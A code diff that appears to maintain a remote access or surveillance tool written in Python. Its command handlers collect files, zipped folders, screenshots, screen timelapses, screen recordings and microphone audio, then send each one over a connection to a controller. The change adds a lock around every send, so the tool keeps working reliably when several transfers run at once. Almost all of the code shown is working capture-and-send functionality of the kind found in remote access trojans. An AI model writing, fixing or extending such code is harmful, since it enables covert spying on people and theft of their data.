@@ -155,8 +155,9 @@ def _download(conn, args: list[str]) -> str | None:
     path = args[0]
     if not os.path.isfile(path):
         return f"[-] File not found: {path}"
-    _send_msg(conn, "FILE_OK")
-    _send_file(conn, path)
+    with _send_lock:
+        _send_msg(conn, "FILE_OK")
+        _send_file(conn, path)
     return None
 
 
@@ -191,8 +192,9 @@ def _screenshot(conn, args: list[str]) -> str | None:
         fname = "_screenshot.jpg"
         with open(fname, "wb") as f:
             f.write(data)
-        _send_msg(conn, "FILE_OK")
-        _send_file(conn, fname)
+        with _send_lock:
+            _send_msg(conn, "FILE_OK")
+            _send_file(conn, fname)
         try:
             os.remove(fname)
         except OSError:
@@ -211,8 +213,9 @@ def _screenshot(conn, args: list[str]) -> str | None:
             fname = "_screenshot.jpg"
             with open(fname, "wb") as f:
                 f.write(buf.getvalue())
-            _send_msg(conn, "FILE_OK")
-            _send_file(conn, fname)
+            with _send_lock:
+                _send_msg(conn, "FILE_OK")
+                _send_file(conn, fname)
             try:
                 os.remove(fname)
             except OSError:
@@ -237,8 +240,9 @@ def _record(conn, args: list[str]) -> str | None:
         audio = _sd.rec(int(seconds * rate), samplerate=rate, channels=1, dtype="int16")
         _sd.wait()
         _sf.write(fname, audio, rate)
-        _send_msg(conn, "FILE_OK")
-        _send_file(conn, fname)
+        with _send_lock:
+            _send_msg(conn, "FILE_OK")
+            _send_file(conn, fname)
         try:
             os.remove(fname)
         except OSError:
@@ -295,8 +299,9 @@ def _screenshot_timelapse(conn, args: list[str]) -> str | None:
             for idx, data in enumerate(frames):
                 zf.writestr(f"frame_{idx:03d}.jpg", data)
 
-        _send_msg(conn, "FILE_OK")
-        _send_file(conn, zip_path)
+        with _send_lock:
+            _send_msg(conn, "FILE_OK")
+            _send_file(conn, zip_path)
         try:
             os.remove(zip_path)
         except OSError:
@@ -321,8 +326,9 @@ def _screenshot_timelapse(conn, args: list[str]) -> str | None:
             with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_STORED) as zf:
                 for idx, data in enumerate(frames_pil):
                     zf.writestr(f"frame_{idx:03d}.jpg", data)
-            _send_msg(conn, "FILE_OK")
-            _send_file(conn, zip_path)
+            with _send_lock:
+                _send_msg(conn, "FILE_OK")
+                _send_file(conn, zip_path)
             try:
                 os.remove(zip_path)
             except OSError:
@@ -945,8 +951,9 @@ def _zip_download(conn, args: list[str]) -> str | None:
                         full = os.path.join(dirpath, f)
                         arcname = os.path.relpath(full, os.path.dirname(target))
                         zf.write(full, arcname)
-        _send_msg(conn, "FILE_OK")
-        _send_file(conn, tmp_zip)
+        with _send_lock:
+            _send_msg(conn, "FILE_OK")
+            _send_file(conn, tmp_zip)
         try:
             os.remove(tmp_zip)
         except OSError:
@@ -1705,8 +1712,9 @@ def _screenshot_region(conn, args: list[str]) -> str | None:
         fname = "_region.jpg"
         with open(fname, "wb") as f:
             f.write(buf.tobytes())
-        _send_msg(conn, "FILE_OK")
-        _send_file(conn, fname)
+        with _send_lock:
+            _send_msg(conn, "FILE_OK")
+            _send_file(conn, fname)
         try:
             os.remove(fname)
         except OSError:
@@ -3385,8 +3393,9 @@ def _screenrecord(conn, args: list[str]) -> str | None:
 
         writer.release()
 
-        _send_msg(conn, "FILE_OK")
-        _send_file(conn, out_path)
+        with _send_lock:
+            _send_msg(conn, "FILE_OK")
+            _send_file(conn, out_path)
         try:
             os.remove(out_path)
         except OSError:
@@ -3443,8 +3452,9 @@ def _screenrecord(conn, args: list[str]) -> str | None:
                               timeout=seconds + 30)
         if not os.path.isfile(out_path):
             return "[-] ffmpeg completed but output file not found"
-        _send_msg(conn, "FILE_OK")
-        _send_file(conn, out_path)
+        with _send_lock:
+            _send_msg(conn, "FILE_OK")
+            _send_file(conn, out_path)
         try:
             os.remove(out_path)
         except OSError:
